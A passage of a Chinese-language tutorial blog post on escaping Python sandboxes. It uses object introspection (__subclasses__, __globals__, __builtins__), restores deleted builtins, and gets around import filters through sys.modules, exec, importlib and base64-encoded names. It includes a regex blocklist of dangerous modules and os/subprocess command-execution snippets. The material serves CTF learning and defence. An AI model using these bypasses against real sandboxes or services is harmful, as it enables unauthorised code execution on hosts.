class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span>.<span class="title">__base__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__base__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>得到object类后，就可以用<code>__subclasses__()</code>方法获得所有继承此类的子类：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()</span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;......</span><br></pre></td></tr></table></figure><p>注：没有限制的话，<code>object</code>类是直接可以使用的</p><h3 id="dict"><a href="#dict" class="headerlink" title="__dict__"></a><code>__dict__</code></h3><p>我们在获得到一个模块时想调用模块中的方法，恰好该方法被过滤了，就可以用该方法bypass</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="number">1</span>  <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__dict__[<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ystem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="number">1</span>  <span class="number">2</span></span><br></pre></td></tr></table></figure><p>与dir()作用相同，都是返回属性、方法等；但一些数据类型是没有<code>__dict__</code>属性的，如<code>[].__dict__</code>会返回错误</p><p><code>__dict__</code>只会显示属于自己的属性，dir()除了显示自己的属性，还显示从父类继承来的属性</p><p>可以使用<code>__dict__</code>来间接调用一些属性或方法，如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__dict__[<span class="string">&#x27;append&#x27;</span>](a, <span class="string">&#x27;ling&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="string">&#x27;ling&#x27;</span>]</span><br></pre></td></tr></table></figure><h3 id="init"><a href="#init" class="headerlink" title="__init__"></a><code>__init__</code></h3><p><code>__init__</code>用于初始化类，在沙盒逃逸中的作用就是为了得到<code>function</code>/<code>method</code>类型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Base</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, a, b</span>):</span></span><br><span class="line"><span class="meta">... </span>            self.a = a</span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Child</span>(<span class="params">Base</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Child</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Child</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; </span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">Child</span>.<span class="title">__init__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">function</span> <span class="title">Base</span>.<span class="title">__init__</span> <span class="title">at</span> 0<span class="title">x7f40d32ed268</span>&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">Child</span>.<span class="title">func</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">function</span> <span class="title">Base</span>.<span class="title">func</span> <span class="title">at</span> 0<span class="title">x7f40d32ed2f0</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a><code>__globals__</code></h3><p>该属性是函数/方法特有的属性，记录当前文件的全局变量的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(func)</span><br><span class="line">[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>, <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>, <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Student</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu = Student()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu.__init__</span><br><span class="line">&lt;bound method Student.__init__ of &lt;__main__.Student instance at <span class="number">0x7fba95e03cb0</span>&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu.__init__.__globals__</span><br><span class="line">&#123;&#x27;func&#x27;: &lt;function func at 0x7fba95db5d70&gt;, &#x27;__builtins__&#x27;: &lt;module &#x27;__builtin__&#x27; (built-in)&gt;, &#x27;__package__&#x27;: None, &#x27;stu&#x27;: &lt;__main__.Student instance at 0x7fba95e03cb0&gt;, &#x27;Student&#x27;: &lt;class __main__.Student at 0x7fba95da29a8&gt;, &#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.__init__.__globals__</span><br><span class="line">&#123;&#x27;func&#x27;: &lt;function func at 0x7fba95db5d70&gt;, &#x27;__builtins__&#x27;: &lt;module &#x27;__builtin__&#x27; (built-in)&gt;, &#x27;__package__&#x27;: None, &#x27;stu&#x27;: &lt;__main__.Student instance at 0x7fba95e03cb0&gt;, &#x27;Student&#x27;: &lt;class __main__.Student at 0x7fba95da29a8&gt;, &#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.__init__</span><br><span class="line">&lt;unbound method Student.__init__&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><p>按照上面的思路，我们可以用<code>__base__</code>获取到所有类的父类Object类，然后再用<code>__subclasses__()</code>获取所有继承此类的子类，这样我们就能成功的利用这些类了</p><p>如果该关键字被过滤了我们可以，以下两者等效</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line">__init__.__getattribute__(<span class="string">&#x27;__global&#x27;</span>+<span class="string">&#x27;s__&#x27;</span>)[<span class="string">&#x27;sys&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="builtins、builtin与builtins"><a href="#builtins、builtin与builtins" class="headerlink" title="builtins、builtin与builtins"></a>builtins、<strong>builtin</strong>与<strong>builtins</strong></h2><p>先说一下，<code>builtin</code>、<code>builtins</code>，<code>__builtin__</code>与<code>__builtins__</code>的区别：首先我们知道，在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫<code>内建模块</code>（或者叫内建命名空间）的东西，它有一些常用函数，变量和类，上面说过。另外，Python 对函数、变量、类等等的查找方式是按 <code>LEGB</code> 规则来找的，其中 B 即代表内建模块。</p><p>在 2.x 版本中，内建模块被命名为 <code>__builtin__</code>，到了 3.x 就成了 <code>builtins</code>。它们都需要 import 才能查看：</p><p>2.x：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>3.x：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> builtins</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>builtins</span><br><span class="line">&lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>而<code>__builtins__</code> 两者都有，实际上是<code>__builtin__</code>和<code>builtins</code> 的引用。它不需要导入，估计是为了统一 2.x 和 3.x。不过<code>__builtins__</code>与<code>__builtin__</code>和<code>builtins</code>是有一点区别的，<code>__builtins__</code> 相对实用一点，并且在 <code>__builtins__</code>里有很多好东西：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;__import__&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">macr0phag3</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;execfile&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>那么既然<code>__builtins__</code>有这么多危险的函数，不如将里面的危险函数破坏了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span></span><br></pre></td></tr></table></figure><p>或者直接删了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br></pre></td></tr></table></figure><p>但是我们可以利用 <code>reload(__builtins__)</code> 来恢复 <code>__builtins__</code>。不过，我们在使用 <code>reload</code> 的时候也没导入，说明<code>reload</code>也在 <code>__builtins__</code>里，那如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。</p><p>这里注意，2.x 的 <code>reload</code> 是内建的，3.x 需要 <code>import imp</code>，然后再 <code>imp.reload</code>。同样也可以reload其他模块。</p><h2 id="花式import"><a href="#花式import" class="headerlink" title="花式import"></a>花式import</h2><p>对于防御者来说,最基础的思路,就是对代码的内容进行检查<br><strong>最常见的方法呢,就是禁止引入敏感的包</strong>，举个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">code = open(<span class="string">&#x27;code.py&#x27;</span>).read()</span><br><span class="line">pattern  = re.compile(<span class="string">&#x27;import\s+(os|commands|subprocess|sys)&#x27;</span>)</span><br><span class="line">match = re.search(pattern,code)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;forbidden module import detected&quot;</span></span><br><span class="line">    <span class="keyword">raise</span> Exception</span><br></pre></td></tr></table></figure><p>用以上的几行代码,就可以简单的完成对于敏感的包的检测</p><p>我们知道,要执行shell命令,必须引入<code>os/commands/subprocess</code>这几个包,<br>对于攻击者来说,改如何绕过呢,必须使用其他的引入方式</p><h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p>import可以用来导入一个包，在模块导入的时候，默认在当前目录下查找，然后再在系统中查找，系统查找的范围是<code>sys.path</code>下的所有路径：</p><img src="/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/TIM截图20200220233605.png" style="zoom:80%;"><p>import的本质是：搜索modules并绑定到局部变量</p><p><code>import module_name</code>实质是将<code>module_name.py</code>中的全部代码加载到内存并赋值给与模块同名的变量写在当前文件中，这个变量的类型是<code>module</code></p><img src="/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/TIM截图20200220234413.png" style="zoom:80%;"><p>现在设置一下modules中<code>os</code>的值为None：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Traceback (most recent call last):</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ImportError: No module named os</span><br></pre></td></tr></table></figure><p>发现把os从<code>modules</code>中删去就不能直接引入了；但是，我们可以接着设置<code>os</code>的模块的路径，从而引入该模块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><p>注意，这里不能用 <code>del sys.modules[&#39;os&#39;]</code>，因为，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。</p><p>所以删了 <code>sys.modules[&#39;os&#39;]</code> 只会让 Python 重新加载一次 os。</p><p>看到这你肯定发现了，对于上面的过滤方式，绕过的方式可以是这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span> <span class="comment"># oj 为你加的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>如果sys模块也不能用，那么就不能通过设置路径来重新引入模块了，但可以使用python的内建函数：</p><ul><li>execfile：execfile() 函数可以用来执行一个文件(python2)</li><li>exec：执行存储在字符串或文件中的python语句；python2的exec是一个内置语句而不是函数；python3将python2中的exec和execfile()功能整合到一个exec()函数中了</li></ul><p>例如(python2)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; execfile(&#39;&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py&#39;)</span><br><span class="line">&gt;&gt;&gt; system(&#39;ls &#x2F;&#39;)</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">exec</span> open(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>system(<span class="string">&#x27;ls　/&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="import-1"><a href="#import-1" class="headerlink" title="__import__()"></a><code>__import__()</code></h3><p><code>__import__</code>作为一个函数，只能接受字符串参数，返回值可以直接用来操作；通常在动态加载的时候用到这个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__import__(<span class="string">&#x27;re&#x27;</span>).findall(<span class="string">&#x27;(hi)&#x27;</span>, <span class="string">&#x27;hilinghi&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;hi&#x27;</span>, <span class="string">&#x27;hi&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><h3 id="importlib"><a href="#importlib" class="headerlink" title="importlib"></a>importlib</h3><p><code>importlib</code>模块是对<code>import</code>和<code>__import__()</code>的补充；它也可以通过传入字符串来引入一个模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = importlib.import_module(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.chdir(<span class="string">&#x27;../&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="dir-与-dict"><a href="#dir-与-dict" class="headerlink" title="dir 与 __dict__"></a>dir 与 <code>__dict__</code></h3><p>这两种方法都是一个目的,那就是列出一个模组/类/对象 下面 所有的属性和函数<br>这在沙盒逃逸中是很有用的,可以找到隐藏在其中的一些东西</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>A.__dict__</span><br><span class="line">mappingproxy(&#123;<span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;asdas&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>: &lt;attribute <span class="string">&#x27;__dict__&#x27;</span> of <span class="string">&#x27;A&#x27;</span> objects&gt;, <span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__weakref__&#x27;</span>: &lt;attribute <span class="string">&#x27;__weakref__&#x27;</span> of <span class="string">&#x27;A&#x27;</span> objects&gt;, <span class="string">&#x27;c&#x27;</span>: &lt;function A.c at <span class="number">0x7f18ea25e510</span>&gt;, <span class="string">&#x27;__module__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(A)</span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__weakref__&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="常用的模块和方法"><a href="#常用的模块和方法" class="headerlink" title="常用的模块和方法"></a>常用的模块和方法</h2><h3 id="执行命令和代码"><a href="#执行命令和代码" class="headerlink" title="执行命令和代码"></a>执行命令和代码</h3><h4 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">__import__(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;ls&quot;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="platform模块"><a href="#platform模块" class="headerlink" title="platform模块"></a>platform模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.popen(<span class="string">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.call(<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;ls&#x27;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()</span><br><span class="line"><span class="comment"># stdin, stdout, stderr： 分别表示程序标准输入、输出、错误句柄。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><strong>如果shell=True的话，curl命令是被Bash(Sh)启动，所以支持shell语法。 如果shell=False的话，启动的是可执行程序本身，后面的参数不再支持shell语法。</strong></p><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><h4 id="file-函数"><a href="#file-函数" class="headerlink" title="file()函数"></a>file()函数</h4><p>该函数只存在于Python2，Python3不存在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(<span class="string">&#x27;test.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="open-函数"><a href="#open-函数" class="headerlink" title="open()函数"></a>open()函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">&#x27;text.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="bypass的一些套路"><a href="#bypass的一些套路" class="headerlink" title="bypass的一些套路"></a>bypass的一些套路</h2><h3 id="字符串过滤"><a href="#字符串过滤" class="headerlink" title="字符串过滤"></a>字符串过滤</h3><p>如果沙箱对导入的包名称做了限制，我们可以在导入模块前先对模块名称做处理，如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;os&#x27;</span>.encode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = __import__(<span class="string">&#x27;b3M=\n&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.chdir(<span class="string">&#x27;../&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.getcwd()</span><br><span class="line"><span class="string">&#x27;/home&#x27;</span></span><br></pre></td></tr></table></figure><p>代码中要是出现 <code>os</code>，直接不让运行。那么可以利用字符串的各种变化来引入 os：</p><figure 